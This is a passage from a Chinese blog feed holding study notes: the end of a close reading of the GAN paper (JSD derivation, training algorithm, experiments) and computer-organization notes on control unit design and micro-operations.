src="/2024/09/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB4%EF%BC%9AGAN/image3.png"></p><p>并且通过从$C(G)&#x3D;V\left(D_{G}^{*}, G\right)$中减去这个表达式，我们得到：</p><p>$$<br>C(G)&#x3D;-\log (4)+K L\left(p_{\text {data }} | \frac{p_{\text {data }}+p_{g}}{2}\right)+K L\left(p_{g} | \frac{p_{\text {data }}+p_{g}}{2}\right) \quad \quad (5)<br>$$</p><p>其中 KL 是 Kullback-Leibler 散度。我们在先前的表达式中认识到模型分布和数据生成过程之间的 Jensen-Shannon 散度：</p><p>$$<br>C(G)&#x3D;-\log (4)+2 \cdot J S D\left(p_{\text {data }} | p_{g}\right) \quad \quad (6)<br>$$</p><h2 id="5-2-算法1的收敛性"><a href="#5-2-算法1的收敛性" class="headerlink" title="5.2 算法1的收敛性"></a>5.2 算法1的收敛性</h2><blockquote><p>算法 1 生成对抗网络的小批量随机梯度下降训练。应用于鉴别器$  k  $的步数是一个超参数。在我们的实验中，我们使用了$ k &#x3D; 1$，这是最便宜的选择。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> number_of_training_iterations <span class="keyword">do</span>:</span><br><span class="line">    <span class="keyword">for</span> k_steps <span class="keyword">do</span>:</span><br><span class="line">        从噪声先验<span class="built_in">Pg</span>(z)中采样m个噪声样本的minibatch&#123;<span class="built_in">z</span>(<span class="number">1</span>),., <span class="built_in">z</span>(m)&#125;</span><br><span class="line">        从噪声先验<span class="built_in">Pdata</span>(x)中采样m个噪声样本的minibatch&#123;<span class="built_in">x</span>(<span class="number">1</span>),., <span class="built_in">x</span>(m)&#125;</span><br><span class="line">        通过使用随机梯度来更新鉴别器D</span><br><span class="line">            ∇θd <span class="number">1</span>/m ∑i=<span class="number">1</span>~m [<span class="built_in">logD</span>(<span class="built_in">x</span>(i)) + <span class="built_in">log</span>(<span class="number">1</span> − <span class="built_in">D</span>(<span class="built_in">G</span>(<span class="built_in">z</span>(i))))]</span><br><span class="line">    end <span class="keyword">for</span></span><br><span class="line">    从噪声先验<span class="built_in">Pg</span>(z)中采样m个噪声样本的minibatch&#123;<span class="built_in">z</span>(<span class="number">1</span>),., <span class="built_in">z</span>(m)&#125;</span><br><span class="line">    通过使用随机梯度来更新生成器G</span><br><span class="line">        ∇θg <span class="number">1</span>/m ∑i=<span class="number">1</span>~m <span class="built_in">log</span>(<span class="number">1</span>−<span class="built_in">D</span>(<span class="built_in">G</span>(<span class="built_in">z</span>(i))))</span><br><span class="line">end <span class="keyword">for</span></span><br><span class="line">基于梯度的更新可以使用任何标准的基于梯度的学习规则.我们在实验中使用了动量法</span><br></pre></td></tr></table></figure><p><strong>命题2：</strong>如果$G$和$D$有足够的容量，在算法1的每一步，允许鉴别器D在给定G的情况下达到其最优，并更新$P_g$以提高准则：</p><p><img src="/2024/09/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB4%EF%BC%9AGAN/image2.png"></p><p>然后$P_g$收敛到$P_{data}$。</p><p><strong>证明：</strong>考虑$  V (G, D) &#x3D; U (P_g , D)  $作为$P_g$的函数，如上述标准中所做的那样。请注意，$U (P_g , D) $在$P_g$中是凸的。凸函数上确界的子导数包括函数在达到最大值的点的导数。换句话说，如果$f(x)&#x3D; \text{sup}_{α \in {A}} f_α(x)$和$  fα(x)  $对于每个$  α  $在$  x  $中是凸的，那么如果$ β &#x3D; arg \sup_α∈A f_α(x)$，则$∂fβ (x) ∈ ∂f$。这相当于在给定相应的$  G  $的情况下计算最优$  D  $处$P_g$的梯度下降更新。$\sup_D U (p_g, D)$在pg中是凸的，具有唯一的全局最优，如算法1所示，因此$P_g$的更新足够小，$P_g$收敛到$P_x$，结束证明。</p><p>在实践中，对抗网络通过函数$  G(z; θg )  $表示有限的分布族$P_g$，我们优化了$  θg  $而不是$P_g$本身，因此证明不适用。然而，多层感知器在实践中的出色表现表明，尽管它们缺乏理论保证，但它们是一个合理的模型。</p><hr><h1 id="6-Experiments"><a href="#6-Experiments" class="headerlink" title="6 Experiments"></a>6 Experiments</h1><p>我们训练了一系列数据集，包括MNIST[21]、多伦多人脸数据库(TFD)[27]和CIFAR-10[19]。生成器网络使用整流器线性激活[17,8]和sigmoid激活的混合，而鉴别器网络使用maxout[9]激活。Dropout [16] 用于训练鉴别器网络。虽然我们的理论框架允许在生成器的中间层使用 dropout 和其他噪声，但我们使用噪声作为输入来仅输入生成器网络的最底层。</p><p>我们通过将高斯$  Parzen  $窗口拟合到$  G  $生成的样本并在该分布下报告对数似然来估计$ p_g$下测试集数据的概率。高斯的$  σ  $参数是通过对验证集的交叉验证获得的。该过程在Breuleux等人[7]中引入，并用于精确似然不可处理的各种生成模型[24,3,4]。结果如表1所示。</p><p><img src="/2024/09/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB4%EF%BC%9AGAN/image_osk9Vvx3Kc.png"></p><blockquote><p>表 1：Parzen 基于窗口的对数似然估计。MNIST 上报告的数字是测试集上样本的平均对数似然，其标准误差是跨示例计算的平均值。在 TFD 上，我们计算了数据集折叠的标准误差，并使用每个折叠的验证集选择了不同的$ σ$。在 TFD 上，$ σ$在每个折叠上交叉验证，并计算每个折叠的平均对数似然。对于 MNIST，我们与数据集的实值（而不是二进制）版本的其他模型进行比较。</p></blockquote><p>这种估计可能性的方法方差有些高，在高维空间中表现不佳，但它是我们知识可用的最佳方法。可以采样但不估计可能性的生成模型的进步直接激发了对如何评估此类模型的进一步研究。</p><p><img src="/2024/09/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB4%EF%BC%9AGAN/image_U5D7a1sNk_.png"></p><blockquote><p>图2：来自模型的样本的可视化。最右边的列显示了相邻样本最近的训练示例，以证明模型没有记住训练集。样本是公平的随机抽取，而不是精心挑选。与深度生成模型的大多数其他可视化不同，这些图像显示了来自模型分布的实际样本，而不是给定隐藏单元样本的条件均值。此外，这些样本不相关，因为采样过程不依赖于马尔可夫链混合。<br>a) MNIST b) TFD c) CIFAR-10（全连接模型） d) CIFAR-10（卷积鉴别器和“反卷积”生成器）</p></blockquote><p><img src="/2024/09/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB4%EF%BC%9AGAN/image_iqgh45Du10.png"></p><blockquote><p>图3：通过在完整模型的$  z  $空间中的坐标之间进行线性插值获得的数字。</p></blockquote><p>在图 2 和图 3 中，我们展示了训练后从生成器网络中抽取的样本。虽然我们没有声称这些样本比现有方法生成的样本更好，但我们相信这些样本与文献中更好的生成模型至少具有竞争力，并强调了对抗框架的潜力。</p><hr><h1 id="7-Advantages-and-disadvantages"><a href="#7-Advantages-and-disadvantages" class="headerlink" title="7 Advantages and disadvantages"></a>7 Advantages and disadvantages</h1><p>与以前的建模框架相比，这个新框架具有优点和缺点。缺点是$p_g(x)$没有明确的表示，在训练过程中，$D$必须与$G$很好地同步（特别是，$G$不能在不更新$D$的情况下训练太多，以避免“Helvetica场景”，其中$G$将太多的$z$值折叠到相同的$x$值，以便有足够的多样性来建模$p_{data}$），就像Boltzmann机器的负链必须在学习步骤之间保持迄今为止。优点是不需要马尔可夫链，只使用backprop来获得梯度，在学习过程中不需要推理，并且可以将各种各样的函数合并到模型中。表 2 总结了生成对抗网络与其他生成建模方法的比较。</p><blockquote><p>表 2：生成建模的挑战：总结了不同深度生成建模方法遇到的困难，用于涉及模型的每个主要操作。</p></blockquote><p><img src="/2024/09/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB4%EF%BC%9AGAN/image_9HyUW2ElcB.png"></p><p>上述优点主要是计算。对抗模型也可以从生成器网络中获得一些统计优势，而不是直接使用数据示例进行更新，而只有梯度流过鉴别器。这意味着输入的组件不会直接复制到生成器的参数中。对抗网络的另一个优点是它们可以表示非常尖锐甚至退化的分布，而基于马尔可夫链的方法要求分布有些模糊，以便链能够在模式之间混合。</p><hr><h1 id="8-Conclusions-and-future-work"><a href="#8-Conclusions-and-future-work" class="headerlink" title="8 Conclusions and future work"></a>8 Conclusions and future work</h1><p>该框架允许许多直接的扩展：</p><ol><li>通过将$  c  $作为$  G  $和$  D  $的输入，可以获得条件生成模型$ p(x | c)$</li><li>可以通过训练辅助网络来预测给定$  x  $的$  z  $来执行学习的近似推理。这类似于wake-sleep算法[15]训练的推理网络，但优点是在生成器网络完成训练后，推理网络可以针对固定的生成器网络进行训练</li><li>可以近似对所有条件$ p(\boldsymbol{x}_{S} \mid \boldsymbol{x}) $进行建模，其中$S$是$x$的索引的子集，通过训练一组共享参数的条件模型。本质上，可以使用对抗网络来实现确定性MP-DBM[10]的随机扩展</li><li><strong>半监督学习：</strong>当可用的标记数据有限时，来自鉴别器或推理网络的特征可以提高分类器的性能</li><li><strong>效率改进：</strong>通过设计更好的协调$  G  $和$  D  $的方法或在训练期间确定更好的分布来采样$ z$，可以大大加快训练速度</li></ol><p>本文证明了对抗性建模框架的可行性，表明这些研究方向可能被证明是有用的。</p>]]></content>
      
      
      <categories>
          
          <category> 科研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文精读 </tag>
            
            <tag> GAN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理第10章：控制单元的设计</title>
      <link href="/2024/09/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E8%AE%BE%E8%AE%A1/"/>
      <url>/2024/09/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E8%AE%BE%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="1-组合逻辑设计"><a href="#1-组合逻辑设计" class="headerlink" title="1 组合逻辑设计"></a>1 组合逻辑设计</h1><h2 id="1-1-组合逻辑控制单元框图"><a href="#1-1-组合逻辑控制单元框图" class="headerlink" title="1.1 组合逻辑控制单元框图"></a>1.1 组合逻辑控制单元框图</h2><p>如果将指令译码和节拍发生器从CU中分离出来，可得到简化的控制单元框图如下：</p><p><img src="/2024/09/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E8%AE%BE%E8%AE%A1/image_4B9Oui2VVO.png"></p><h2 id="1-2-组合逻辑设计步骤"><a href="#1-2-组合逻辑设计步骤" class="headerlink" title="1.2 组合逻辑设计步骤"></a>1.2 组合逻辑设计步骤</h2><h3 id="1-2-1-列出操作时间表"><a href="#1-2-1-列出操作时间表" class="headerlink" title="1.2.1 列出操作时间表"></a>1.2.1 列出操作时间表</h3><p><img src="/2024/09/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E8%AE%BE%E8%AE%A1/image_wrt3UlGYFC.png"></p><p><img src="/2024/09/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E8%AE%BE%E8%AE%A1/image_cyY1mSJd-9.png"></p><p><img src="/2024/09/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E8%AE%BE%E8%AE%A1/image_Q5P5XEBbly.png"></p><h3 id="1-2-2-写出微操作命令的最简表达式"><a href="#1-2-2-写出微操作命令的最简表达式" class="headerlink" title="1.2.2 写出微操作命令的最简表达式"></a>1.2.2 写出微操作命令的最简表达式</h3><p>根据上述操作时间表可以列出每一个微操作命令的初始逻辑表达式，经化简、整理便可获得能用现成电路实现的微操作命令逻辑表达式。例如：</p><p>$$<br>\begin{array}{l}\\mathrm{M}(\mathrm{MAR}) \longrightarrow \mathrm{MDR} \\&#x3D;\mathrm{FE} \cdot T_{1}+\mathrm{IND} \cdot T_{1}(\mathrm{ADD}+\mathrm{STA}+\mathrm{LDA}+\mathrm{JMP}+\mathrm{BAN}) \\+\mathrm{EX} \cdot T_{1}(\mathrm{ADD}+\mathrm{LDA}) \\&#x3D;T_{1}{\mathrm{FE}+\mathrm{IND}(\mathrm{ADD}+\mathrm{STA}+\mathrm{LDA}+\mathrm{JMP}+\mathrm{BAN}) \\+\operatorname{EX}(\mathrm{ADD}+\mathrm{LDA})}\end{array}<br>$$</p><h3 id="1-2-3-画出逻辑图"><a href="#1-2-3-画出逻辑图" class="headerlink" title="1.2.3 画出逻辑图"></a>1.2.3 画出逻辑图</h3><p><img src="/2024/09/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E8%AE%BE%E8%AE%A1/image_7IG8FKUXtJ.png"></p><p>采用组合逻辑设计方法设计方法设计控制单元，思路清晰，简单明了，速度快（RISC）。但是线路结构十分庞杂，也不规范，调试困难。</p><hr><h1 id="2-微程序设计"><a href="#2-微程序设计" class="headerlink" title="2 微程序设计"></a>2 微程序设计</h1><p>将一条机器指令编写成一个微程序，每一个微程序包含若干条微指令，每一条微指令对应一个或几个微操作命令。</p><p>微程序设计省去了组合逻辑设计过程中对逻辑表达式的化简步骤，无须考虑逻辑门级数和门的扇入希数，设计简单，并且便于调试。缺点是速度较慢。</p><h2 id="2-1-微程序控制单元框图及工作原理"><a href="#2-1-微程序控制单元框图及工作原理" class="headerlink" title="2.1 微程序控制单元框图及工作原理"></a>2.1 微程序控制单元框图及工作原理</h2><p>采用微程序设计方法设计控制单元的过程就是编写每一条机器指令的微程序，它是按执行每条机器指令所需的微操作命令的先后顺序而编写的。</p><h3 id="2-1-1-机器指令对应的微程序"><a href="#2-1-1-机器指令对应的微程序" class="headerlink" title="2.1.1 机器指令对应的微程序"></a>2.1.1 机器指令对应的微程序</h3><p>一条机器指令对应一个微程序，如下图所示。</p><p><img src="/2024/09/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E8%AE%BE%E8%AE%A1/image_5GC_7h2CTe.png"></p><h3 id="2-1-2-微程序控制单元的基本框图"><a href="#2-1-2-微程序控制单元的基本框图" class="headerlink" title="2.1.2 微程序控制单元的基本框图"></a>2.1.2 微程序控制单元的基本框图</h3><p>图中点画框内为微程序控制单元，其中的<strong>控制存储器</strong>（简称<strong>控存</strong>）是微程序控制单元的核心部件，用来存放全部微程序；<strong>CMAR</strong>是<strong>控存地址寄存器</strong>，用来存放欲读出的微指令地址；<strong>CMDR</strong>是<strong>控存数据寄存器</strong>，用来存放从控存读出的微操作。</p><p><img src="/2024/09/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E8%AE%BE%E8%AE%A1/image_IrJgvDUy-k.png"></p><p>微指令的基本格式如下图所示，分为两个字段：</p><ol><li><strong>操作控制字段</strong>：发出各种控制信号</li><li><strong>顺序控制字段</strong>：可指出下条微指令的地址（简称下地址）</li></ol><p><img src="/2024/09/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E8%AE%BE%E8%AE%A1/image_kuXAez9QOV.png"></p><h2 id="2-2-微指令的编码方式"><a href="#2-2-微指令的编码方式" class="headerlink" title="2.2 微指令的编码方式"></a>2.2 微指令的编码方式</h2><p>编码方式又称微指令的控制方式，是指如何对微指令的控制字段进行编码，以形成控制信号。</p><h3 id="2-2-1-直接编码（直接控制）"><a href="#2-2-1-直接编码（直接控制）" class="headerlink" title="2.2.1 直接编码（直接控制）"></a>2.2.1 直接编码（直接控制）</h3><p><strong>直接编码</strong>是指在微指令的操作控制字段中，每一位代表一个微操作命令。</p><p><img src="/2024/09/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E8%AE%BE%E8%AE%A1/image_VSgsTWGP_U.png"></p><ul><li>“1”代表控制信号有效</li><li>“0”代表控制信号无效</li></ul><h3 id="2-2-2-字段直接编码"><a href="#2-2-2-字段直接编码" class="headerlink" title="2.2.2 字段直接编码"></a>2.2.2 字段直接编码</h3><p><strong>字段直接编码</strong>是指将控制字段分成若干 “段”，将一组互斥的微指令操作命令放在一个字段内，每段经译码后发出控制信号。这种方式因靠字段直接译码发出微命令，故又有显示编码之称。</p><p><img src="/2024/09/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E8%AE%BE%E8%AE%A1/image_jqkl7BDZcC.png"></p><h3 id="2-2-3-字段间接编码"><a href="#2-2-3-字段间接编码" class="headerlink" title="2.2.3 字段间接编码"></a>2.2.3 字段间接编码</h3><p>这种方式一个字段的某些微命令还需由另一个字段中的某些微命令来解释，称为<strong>字段间接编码</strong>，又称<strong>隐式编码</strong>。</p><p><img src="/2024/09/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E8%AE%BE%E8%AE%A1/image_wW2wD4yrfY.png"></p><h3 id="2-2-4-混合编码"><a href="#2-2-4-混合编码" class="headerlink" title="2.2.4 混合编码"></a>2.2.4 混合编码</h3><p>把直接编码和字段编码（直接或间接）混合使用。</p><h2 id="2-3-微指令序列地址的形成"><a href="#2-3-微指令序列地址的形成" class="headerlink" title="2.3 微指令序列地址的形成"></a>2.3 微指令序列地址的形成</h2><ol><li>直接由微指令的下地址字段指出</li><li>根据机器指令的操作码形成</li><li>增量计数器法</li><li>分支转移</li><li>通过测试网络形成</li></ol><p><img src="/2024/09/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E8%AE%BE%E8%AE%A1/image_AgQRj9rey9.png"></p><ol start="6"><li>由硬件产生微程序入口地址</li></ol><h2 id="2-4-微指令格式"><a href="#2-4-微指令格式" class="headerlink" title="2.4 微指令格式"></a>2.4 微指令格式</h2><p>微指令格式与微指令的编码方式有关，通常分为<strong>水平型微指令</strong>和<strong>垂直型微指令</strong>两种。</p><h3 id="2-4-1-水平型微指令"><a href="#2-4-1-水平型微指令" class="headerlink" title="2.4.1 水平型微指令"></a>2.4.1 水平型微指令</h3><p><strong>水平型微指令</strong>的特点是一次能定义并执行多个并行操作的微命令。</p><h3 id="2-4-2-垂直型微指令"><a href="#2-4-2-垂直型微指令" class="headerlink" title="2.4.2 垂直型微指令"></a>2.4.2 垂直型微指令</h3><p><strong>垂直型微指令</strong>的特点是采用类似机器指令操作码的方式，在微指令字中，设置微操作码字段，由微操作码规定微指令的功能。</p><p>通常一条微指令有1~2个微命令，控制1~2种操作。</p><h3 id="2-4-3-两种微指令格式的比较"><a href="#2-4-3-两种微指令格式的比较" class="headerlink" title="2.4.3 两种微指令格式的比较"></a>2.4.3 两种微指令格式的比较</h3><ol><li>水平型微指令比垂直型微指令并行操作能力强、效率高、灵活性强</li><li>水平型微指令执行一条机器指令所需的微指令数目少，因此速度比垂直型微指令的速度快</li><li>水平型微指令用较短的微程序结构换取较长的微指令结构，垂直型微指令正好相反，它以较长的微程序结构换取较短的微指令结构</li><li>水平型微指令与机器指令差别较大，垂直型微指令和机器指令相似</li></ol><h2 id="2-5-静态微程序设计和动态微程序设计"><a href="#2-5-静态微程序设计和动态微程序设计" class="headerlink" title="2.5 静态微程序设计和动态微程序设计"></a>2.5 静态微程序设计和动态微程序设计</h2><p><strong>静态微程序设计</strong>：通常指令系统是固定的，对应每一条机器指令的微程序是计算机设计者事先编写好的，因此一般微程序无须改变，其控制存储器采用ROM。</p><p><strong>动态微程序设计</strong>：人们可以通过改变微指令和微程序来改变机器的指令系统，其控制存储器采用EPROM。</p><h2 id="2-6-豪微程序设计"><a href="#2-6-豪微程序设计" class="headerlink" title="2.6 豪微程序设计"></a>2.6 豪微程序设计</h2><p><strong>微程序设计</strong>用<strong>微程序解释机器指令</strong>，<strong>毫微程序设计</strong>用<strong>毫微程序解释微程序</strong>，<strong>毫微指令与微指令</strong>的关系好比<strong>微指令与机器指令</strong>的关系。</p><p><img src="/2024/09/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC10%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E8%AE%BE%E8%AE%A1/image_U9XAOdQB1w.png"></p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理第9章：控制单元的功能</title>
      <link href="/2024/09/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E5%8A%9F%E8%83%BD/"/>
      <url>/2024/09/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E5%8A%9F%E8%83%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="1-微操作命令的分析"><a href="#1-微操作命令的分析" class="headerlink" title="1 微操作命令的分析"></a>1 微操作命令的分析</h1><p>控制单元具有发出各种微操作命令（即控制信号）序列的功能。</p><h2 id="1-1-取值周期"><a href="#1-1-取值周期" class="headerlink" title="1.1 取值周期"></a>1.1 取值周期</h2><p>假设CPU内含有4个寄存器：</p><ul><li><strong>MAR</strong>与地址总线相连，存放欲访问的存储单元地址</li><li><strong>MDR</strong>与数据总线相连，存放欲写入存储器的信息或最新从存储器中读出的信息</li><li><strong>PC</strong>存放现行指令的地址，有计数功能</li><li><strong>IR</strong>存放现行指令</li></ul><p>取值周期的过程归纳如下：</p><p><img src="/2024/09/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E5%8A%9F%E8%83%BD/image_1t3TFoikyp.png"></p><h2 id="1-2-间址周期"><a href="#1-2-间址周期" class="headerlink" title="1.2 间址周期"></a>1.2 间址周期</h2><p><img src="/2024/09/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E5%8A%9F%E8%83%BD/image_NCIfbPSipX.png"></p><h2 id="1-3-执行周期"><a href="#1-3-执行周期" class="headerlink" title="1.3 执行周期"></a>1.3 执行周期</h2><p>不同指令的指令周期的微操作是不同的，下面分别讨论非访存指令、访存指令和转移类指令的微操作。</p><h3 id="1-3-1-非访存指令"><a href="#1-3-1-非访存指令" class="headerlink" title="1.3.1 非访存指令"></a>1.3.1 非访存指令</h3><ol><li>清除累加器指令CLA：$0 \rightarrow \mathrm{ACC}$</li><li>累加器取反指令COM：$\overline{\mathrm{ACC}} \rightarrow \mathrm{ACC}$</li><li>算术右移一位指令SHR：$\mathrm{L}(\mathrm{ACC}) \rightarrow \mathrm{R}(\mathrm{ACC}), \mathrm{ACC}<em>{0} \rightarrow \mathrm{ACC}</em>{0}$</li><li>循环左移一位指令CSL：$\mathrm{R}(\mathrm{ACC}) \rightarrow \mathrm{L}(\mathrm{ACC}), \mathrm{ACC}<em>{0} \rightarrow \mathrm{ACC}</em>{n}$</li><li>停机指令STP：$0 \rightarrow \mathrm{G}$</li></ol><h3 id="1-3-2-访存指令"><a href="#1-3-2-访存指令" class="headerlink" title="1.3.2 访存指令"></a>1.3.2 访存指令</h3><p>这类指令在执行阶段都需要访存存储器，这里只考虑直接寻址的情况，不考虑其他寻址方式。</p><h4 id="1-3-2-1-加法指令ADD-X"><a href="#1-3-2-1-加法指令ADD-X" class="headerlink" title="1.3.2.1 加法指令ADD X"></a>1.3.2.1 加法指令ADD X</h4><p>$$<br>\begin{array}{l}\operatorname{Ad}(\mathrm{IR}) \rightarrow \mathrm{MAR} \ 1 \rightarrow \mathrm{R} \ \mathrm{M}(\mathrm{MAR}) \rightarrow \mathrm{MDR} \ (\mathrm{ACC})+(\mathrm{MDR}) \rightarrow \mathrm{ACC}\end{array}<br>$$</p><h4 id="1-3-2-2-存数指令STA-X"><a href="#1-3-2-2-存数指令STA-X" class="headerlink" title="1.3.2.2 存数指令STA X"></a>1.3.2.2 存数指令STA X</h4><p>$$<br>\begin{array}{l}\operatorname{Ad}(\mathrm{IR}) \rightarrow \mathrm{MAR} \ 1 \rightarrow \mathrm{W} \ \mathrm{ACC} \rightarrow \mathrm{MDR} \ \mathrm{MDR} \rightarrow \mathrm{M}(\mathrm{MAR})\end{array}<br>$$</p><h4 id="1-3-2-3-取数指令LDA-X"><a href="#1-3-2-3-取数指令LDA-X" class="headerlink" title="1.3.2.3 取数指令LDA X"></a>1.3.2.3 取数指令LDA X</h4><p>$$<br>\begin{array}{l}\mathrm{Ad}(\mathrm{IR}) \rightarrow \mathrm{MAR} \ 1 \rightarrow \mathrm{R} \ \mathrm{M}(\mathrm{MAR}) \rightarrow \mathrm{MDR} \ \mathrm{MDR} \rightarrow \mathrm{ACC}\end{array}<br>$$</p><h3 id="1-3-3-转移指令"><a href="#1-3-3-转移指令" class="headerlink" title="1.3.3 转移指令"></a>1.3.3 转移指令</h3><ol><li>无条件转移指令JMP X：$\operatorname{Ad}(\mathrm{IR}) \rightarrow \mathrm{PC}$</li><li>条件转移（负则转）指令BAN X：$\mathrm{A}<em>{0} \cdot \mathrm{Ad}(\mathrm{IR})+\overline{\mathrm{A}}</em>{0}(\mathrm{PC}) \rightarrow \mathrm{PC}$</li></ol><h3 id="1-3-4-三类指令的指令周期"><a href="#1-3-4-三类指令的指令周期" class="headerlink" title="1.3.4 三类指令的指令周期"></a>1.3.4 三类指令的指令周期</h3><p><img src="/2024/09/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E5%8A%9F%E8%83%BD/image_7Yt3OMTwcg.png"></p><h2 id="1-4-中断周期"><a href="#1-4-中断周期" class="headerlink" title="1.4 中断周期"></a>1.4 中断周期</h2><p>在执行周期结束时刻，CPU要查询是否有请求中断的事件发生，如果有则进入中断周期。</p><p>在中断周期，由中断隐指令自动完成保护断点、寻找中断服务程序入口地址以及硬件关中断的操作。在中断周期需完成如下操作：</p><p><img src="/2024/09/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E5%8A%9F%E8%83%BD/image_7zKAqsA-J4.png"></p><hr><h1 id="2-控制单元的功能"><a href="#2-控制单元的功能" class="headerlink" title="2 控制单元的功能"></a>2 控制单元的功能</h1><h2 id="2-1-控制单元的外特性"><a href="#2-1-控制单元的外特性" class="headerlink" title="2.1 控制单元的外特性"></a>2.1 控制单元的外特性</h2><p><img 